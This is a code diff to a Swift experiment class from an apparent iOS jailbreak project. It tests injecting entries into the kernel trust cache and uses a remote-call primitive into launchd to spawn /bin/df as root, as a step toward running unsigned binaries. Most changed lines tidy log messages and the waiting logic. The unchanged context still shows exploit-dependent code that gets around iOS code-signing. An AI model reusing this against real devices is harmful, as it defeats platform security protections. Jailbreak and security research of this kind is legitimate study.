@@ -69,14 +69,11 @@ final class ExpTrustCacheInject {
     func runAll() -> [String] {
         results.removeAll()
         
-        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        log("  TRUST CACHE INJECT EXPERIMENT")
-        log("  iOS \(UIDevice.current.systemVersion) | kernel_slide needed")
-        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        log("")
+        log("TRUST CACHE INJECT EXPERIMENT")
+        log("iOS \(UIDevice.current.systemVersion)")
         
         guard mgr.dsready else {
-            log("❌ Kernel exploit not active — jailbreak dulu")
+            log("❌ Kernel exploit not active")
             return results
         }
         
@@ -90,9 +87,7 @@ final class ExpTrustCacheInject {
         test4_verifyInject(slide: slide)
         
         log("")
-        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        log("  DONE")
-        log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        log("-- DONE --")
         
         return results
     }
@@ -100,7 +95,7 @@ final class ExpTrustCacheInject {
     // MARK: - Test 1: Read Trust Cache Slot Table
     
     private func test1_readSlotTable(slide: UInt64) {
-        log("── TEST 1: Read Slot Table ──")
+        log("-- TEST 1: Read Slot Table --")
         
         let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
         log("Slot table: 0x\(String(slotTable, radix: 16))")
@@ -133,7 +128,7 @@ final class ExpTrustCacheInject {
     
     private func test2_findEmptySlot(slide: UInt64) {
         log("")
-        log("── TEST 2: Find Empty Slot ──")
+        log("-- TEST 2: Find Empty Slot --")
         
         let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
         
@@ -159,7 +154,7 @@ final class ExpTrustCacheInject {
     
     private func test3_writeTrustCache(slide: UInt64) {
         log("")
-        log("── TEST 3: Load TC via MobileStorageMounter XPC ──")
+        log("-- TEST 3: Load TC via MSM XPC --")
         
         #if !DISABLE_REMOTECALL
         guard dspmgr.shared.rcready else {
@@ -256,7 +251,7 @@ final class ExpTrustCacheInject {
     
     private func test4_verifyInject(slide: UInt64) {
         log("")
-        log("── TEST 4: Verify — Spawn Binary via launchd ──")
+        log("-- TEST 4: Spawn /bin/df via launchd --")
         
         #if !DISABLE_REMOTECALL
         guard dspmgr.shared.rcready else {
@@ -264,57 +259,47 @@ final class ExpTrustCacheInject {
             return
         }
         
-        log("Spawning /bin/df via launchd (signed binary, should always work)...")
+        // Synchronous-ish: we log the attempt, result comes later
+        // But since runAll() is on background thread, we can wait
         
-        // Use RootExecutor to spawn /bin/df — this tests the full spawn path
-        RootExecutor.shared.executeAsRoot(operation: "tc_verify_spawn") { rc in
-            // posix_spawn /bin/df
+        let semaphore = DispatchSemaphore(value: 0)
+        var spawnResult: (success: Bool, msg: String) = (false, "timeout")
+        
+        RootExecutor.shared.executeAsRoot(operation: "tc_spawn_test") { rc in
             let binPath = remote_alloc_str(rc, "/bin/df")
             let pidAddr = rc.trojanMem + 0x300
             rc[pidAddr].setValue32(0)
             
-            // argv: ["/bin/df", NULL]
             let argvBase = rc.trojanMem + 0x400
             rc[argvBase].setValue64(binPath)
-            rc[argvBase + 8].setValue64(0) // NULL terminator
+            rc[argvBase + 8].setValue64(0)
             
             let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binPath, 0, 0, argvBase, 0)
             let pid = rc[pidAddr].value32()
-            
             RootExecutor.rcall(rc, "free", binPath)
             
             if ret == 0 && pid != 0 {
-                return (true, "posix_spawn OK: /bin/df pid=\(pid)", UInt64(pid))
+                spawnResult = (true, "pid=\(pid)")
             } else {
-                return (false, "posix_spawn FAILED: ret=\(ret) pid=\(pid)", UInt64(ret))
+                spawnResult = (false, "ret=\(ret) pid=\(pid)")
             }
+            semaphore.signal()
+            return (ret == 0, "spawn", UInt64(pid))
         }
         
-        // Wait for result
-        DispatchQueue.main.asyncAfter(deadline: .now() + 6) { [self] in
-            if let result = RootExecutor.shared.lastResult {
-                if result.success {
-                    log("✅ /bin/df spawned successfully (pid=\(result.returnValue))")
-                    log("")
-                    log("   Spawn path via launchd WORKS.")
-                    log("   Signed binary executes without issue.")
-                    log("")
-                    log("   NEXT: Deploy unsigned binary ke /var/jb/tmp/")
-                    log("   lalu spawn — kalau jalan = FULL JAILBREAK ✅")
-                } else {
-                    log("❌ /bin/df spawn failed: \(result.message)")
-                    log("")
-                    log("   Kemungkinan:")
-                    log("   - launchd connection timeout")
-                    log("   - RemoteCall state corrupted")
-                    log("   - Re-jailbreak dan coba lagi")
-                }
-            } else {
-                log("⚠️ No result yet (launchd mungkin masih processing)")
-            }
+        // Wait max 15s for result
+        let waitResult = semaphore.wait(timeout: .now() + 15)
+        
+        if waitResult == .timedOut {
+            log("⚠️ Spawn timed out (launchd busy?)")
+        } else if spawnResult.success {
+            log("✅ /bin/df spawned (\(spawnResult.msg))")
+            log("   Spawn path works — ready for unsigned binary test")
+        } else {
+            log("❌ Spawn failed: \(spawnResult.msg)")
         }
         #else
-        log("❌ DISABLE_REMOTECALL active")
+        log("❌ DISABLE_REMOTECALL")
         #endif
     }
 }
